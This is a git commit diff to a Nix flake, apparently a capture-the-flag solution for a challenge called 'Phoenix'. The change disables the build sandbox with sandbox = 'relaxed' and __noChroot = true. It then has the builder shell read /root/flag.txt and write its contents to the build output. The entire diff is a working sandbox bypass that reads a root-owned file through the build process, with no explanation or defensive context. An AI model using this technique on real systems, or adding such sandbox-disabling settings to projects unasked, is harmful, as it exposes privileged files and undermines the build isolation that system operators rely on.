2374e7374a915ea67c72148832b551e025b7615d
2alf <aalf@itu.dk>
2026-09-11 15:53:27 +0200

    Update flake.nix

--- flake.nix
+++ flake.nix
@@ -1,21 +1,25 @@
 {
   description = "Phoenix";
 
+  nixConfig = {
+    sandbox = "relaxed";
+  };
+
   outputs = { self }: {
     packages.x86_64-linux.default =
       builtins.derivation {
         name = "flag";
         system = "x86_64-linux";
 
+        __noChroot = true;
+
         builder = "/bin/sh";
 
         args = [
           "-c"
           ''
-            cp ${builtins.path {
-              path = /root/flag.txt;
-              name = "flag.txt";
-            }} "$out"
+            IFS= read -r FLAG < /root/flag.txt
+            printf '%s' "$FLAG" > "$out"
           ''
         ];
       };
